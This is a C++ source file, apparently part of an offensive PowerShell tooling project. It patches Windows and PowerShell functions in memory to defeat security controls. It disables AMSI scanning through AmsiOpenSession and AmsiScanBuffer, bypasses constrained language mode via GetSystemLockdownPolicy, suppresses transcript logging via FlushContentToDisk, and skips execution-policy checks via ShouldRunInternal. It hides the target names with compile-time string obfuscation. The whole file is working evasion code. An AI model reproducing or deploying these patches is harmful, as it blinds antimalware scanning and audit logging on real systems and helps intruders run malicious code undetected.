#include "common.h"
#include "patch.h"
#include "clr.h"
#include "obfuscate.h"

// Obfuscated string wrapper functions with static caching
LPCWSTR GetAmsiDllName() {
    static WCHAR buffer[32] = {0};
    if (buffer[0] == L'\0') {
        constexpr auto s = MAKE_OBFUSCATED("amsi");
        s.decode(buffer, 32);
    }
    return buffer;
}

LPCSTR GetAmsiOpenSessionFunc() {
    static char buffer[64] = {0};
    if (buffer[0] == '\0') {
        constexpr auto s = MAKE_OBFUSCATED("AmsiOpenSession");
        s.decodeA(buffer, 64);
    }
    return buffer;
}

LPCSTR GetAmsiScanBufferFunc() {
    static char buffer[64] = {0};
    if (buffer[0] == '\0') {
        constexpr auto s = MAKE_OBFUSCATED("AmsiScanBuffer");
        s.decodeA(buffer, 64);
    }
    return buffer;
}

LPCWSTR GetSystemManagementAutomation() {
    static WCHAR buffer[128] = {0};
    if (buffer[0] == L'\0') {
        constexpr auto s = MAKE_OBFUSCATED("System.Management.Automation");
        s.decode(buffer, 128);
    }
    return buffer;
}

LPCWSTR GetSystemPolicyClass() {
    static WCHAR buffer[128] = {0};
    if (buffer[0] == L'\0') {
        constexpr auto s = MAKE_OBFUSCATED("System.Management.Automation.Security.SystemPolicy");
        s.decode(buffer, 128);
    }
    return buffer;
}

LPCWSTR GetGetSystemLockdownPolicyMethod() {
    static WCHAR buffer[64] = {0};
    if (buffer[0] == L'\0') {
        constexpr auto s = MAKE_OBFUSCATED("GetSystemLockdownPolicy");
        s.decode(buffer, 64);
    }
    return buffer;
}

LPCWSTR GetTranscriptionOptionClass() {
    static WCHAR buffer[128] = {0};
    if (buffer[0] == L'\0') {
        constexpr auto s = MAKE_OBFUSCATED("System.Management.Automation.Host.TranscriptionOption");
        s.decode(buffer, 128);
    }
    return buffer;
}

LPCWSTR GetFlushContentToDiskMethod() {
    static WCHAR buffer[64] = {0};
    if (buffer[0] == L'\0') {
        constexpr auto s = MAKE_OBFUSCATED("FlushContentToDisk");
        s.decode(buffer, 64);
    }
    return buffer;
}

LPCWSTR GetAuthorizationManagerClass() {
    static WCHAR buffer[128] = {0};
    if (buffer[0] == L'\0') {
        constexpr auto s = MAKE_OBFUSCATED("System.Management.Automation.AuthorizationManager");
        s.decode(buffer, 128);
    }
    return buffer;
}

LPCWSTR GetShouldRunInternalMethod() {
    static WCHAR buffer[64] = {0};
    if (buffer[0] == L'\0') {
        constexpr auto s = MAKE_OBFUSCATED("ShouldRunInternal");
        s.decode(buffer, 64);
    }
    return buffer;
}

BOOL modAmsiOpen()
{
    BYTE bPatch[] = { 0xeb };

    return modPatchUnmanaged(
        GetAmsiDllName(),
        GetAmsiOpenSessionFunc(),
        bPatch,
        ARRAYSIZE(bPatch),
        3
    );
}

BOOL modAmsiScan()
{
    BYTE bPattern[] = { 0x41, 0x8b, 0xf8 }; // mov edi,r8d
    BYTE bPatch[] = { 0x48, 0x31, 0xff }; // xor rdi,rdi
    ULONG_PTR pAmsiScanBuffer;
    DWORD dwPatternOffset;

    if (!modGetProcAddr(GetAmsiDllName(), GetAmsiScanBufferFunc(), &pAmsiScanBuffer))
        return FALSE;

    if (!modFindOffset(reinterpret_cast<LPVOID>(pAmsiScanBuffer), bPattern, ARRAYSIZE(bPattern), 100, &dwPatternOffset))
    {
        // The native AMSI patch survives the PowerShell AppDomain and the
        // ShellPower DLL. A later module or live-shell invocation therefore
        // sees the replacement bytes instead of the original instruction.
        // Treat that state as success so repeated use is idempotent.
        if (modFindOffset(reinterpret_cast<LPVOID>(pAmsiScanBuffer), bPatch, ARRAYSIZE(bPatch), 100, &dwPatternOffset))
            return TRUE;

        return FALSE;
    }

    //wprintf(L"[*] Found instruction to patch in AmsiScanBuffer @ 0x%llx (offset: %d)\n", pAmsiScanBuffer + dwPatternOffset, dwPatternOffset);

    return modPatchUnmanaged(
        GetAmsiDllName(),
        GetAmsiScanBufferFunc(),
        bPatch,
        ARRAYSIZE(bPatch),
        dwPatternOffset
    );
}

BOOL modSysPolicyLock(mscorlib::_AppDomain* pAppDomain)
{
    BYTE bPatch[] = { 0x48, 0x31, 0xc0, 0xc3 }; // mov rax, 0; ret;

    return modPatchManaged(
        pAppDomain,
        GetSystemManagementAutomation(),
        GetSystemPolicyClass(),
        GetGetSystemLockdownPolicyMethod(),
        0,
        bPatch,
        ARRAYSIZE(bPatch),
        0
    );
}

BOOL modTransFlush(mscorlib::_AppDomain* pAppDomain)
{
    BYTE bPatch[] = { 0xc3 }; // ret;

    return modPatchManaged(
        pAppDomain,
        GetSystemManagementAutomation(),
        GetTranscriptionOptionClass(),
        GetFlushContentToDiskMethod(),
        0,
        bPatch,
        ARRAYSIZE(bPatch),
        0
    );
}

BOOL modAuthRun(mscorlib::_AppDomain* pAppDomain)
{
    BYTE bPatch[] = { 0xc3 }; // ret;

    return modPatchManaged(
        pAppDomain,
        GetSystemManagementAutomation(),
        GetAuthorizationManagerClass(),
        GetShouldRunInternalMethod(),
        3,
        bPatch,
        ARRAYSIZE(bPatch),
        0
    );
}

BOOL modGetProcAddr(LPCWSTR pwszModuleName, LPCSTR pszProcedureName, PULONG_PTR pProcedureAddress)
{
    BOOL bResult = FALSE;
    HMODULE hModule = NULL;
    FARPROC pProcedure = NULL;

    hModule = GetModuleHandleW(pwszModuleName);
    EXIT_ON_WIN32_ERROR(L"GetModuleHandleW", hModule == NULL);

    pProcedure = GetProcAddress(hModule, pszProcedureName);
    EXIT_ON_WIN32_ERROR(L"", pProcedure == NULL);

    bResult = TRUE;
    *pProcedureAddress = reinterpret_cast<ULONG_PTR>(pProcedure);

exit:
    return bResult;
}

BOOL modPatch(LPVOID pTargetAddress, LPBYTE pSourceBuffer, DWORD dwSourceBufferSize)
{
    BOOL bResult = FALSE;
    DWORD dwOldProtect = 0;
    BOOL bSuccess = FALSE;

    bSuccess = VirtualProtectEx(GetCurrentProcess(), pTargetAddress, dwSourceBufferSize, PAGE_EXECUTE_READWRITE, &dwOldProtect);
    EXIT_ON_WIN32_ERROR(L"VirtualProtectEx", bSuccess == FALSE);

    memcpy_s(pTargetAddress, dwSourceBufferSize, pSourceBuffer, dwSourceBufferSize);

    bSuccess = VirtualProtectEx(GetCurrentProcess(), pTargetAddress, dwSourceBufferSize, dwOldProtect, &dwOldProtect);
    EXIT_ON_WIN32_ERROR(L"VirtualProtectEx", bSuccess == FALSE);

    bResult = TRUE;

exit:
    return bResult;
}

BOOL modPatchUnmanaged(LPCWSTR pwszMdoduleName, LPCSTR pszProcedureName, LPBYTE pbPatch, DWORD dwPatchSize, DWORD dwPatchOffset)
{
    ULONG_PTR pProcedureAddress = 0;

    if (!modGetProcAddr(pwszMdoduleName, pszProcedureName, &pProcedureAddress))
        return FALSE;

    pProcedureAddress += dwPatchOffset;

    //printf("[*] Patching unmanaged function '%s' @ 0x%llx\n", pszProcedureName, pProcedureAddress);

    if (!modPatch(reinterpret_cast<LPVOID>(pProcedureAddress), pbPatch, dwPatchSize))
        return FALSE;

    return TRUE;
}

BOOL modPatchManaged(mscorlib::_AppDomain* pAppDomain, LPCWSTR pwszAssemblyName, LPCWSTR pwszClassName, LPCWSTR pwszMethodName, DWORD dwNbArgs, LPBYTE pbPatch, DWORD dwPatchSize, DWORD dwPatchOffset)
{
    ULONG_PTR pMethodAddress = 0;

    if (!clr::clrGetJitAddr(pAppDomain, pwszAssemblyName, pwszClassName, pwszMethodName, dwNbArgs, &pMethodAddress))
        return FALSE;

    pMethodAddress += dwPatchOffset;

    //wprintf(L"[*] Patching managed function '%ws' @ 0x%llx\n", pwszMethodName, pMethodAddress);

    if (!modPatch(reinterpret_cast<LPVOID>(pMethodAddress), pbPatch, dwPatchSize))
        return FALSE;

    return TRUE;
}

BOOL modFindOffset(LPVOID pStartAddress, LPBYTE pBuffer, DWORD dwBufferSize, DWORD dwMaxSize, PDWORD pdwBufferOffset)
{
    BOOL bResult = FALSE;

    for (DWORD i = 0; i < dwMaxSize - dwBufferSize; i++)
    {
        if (memcmp(pBuffer, (LPVOID)((ULONG_PTR)pStartAddress + i), dwBufferSize) == 0)
        {
            *pdwBufferOffset = i;
            bResult = TRUE;
            break;
        }
    }

    return bResult;
}
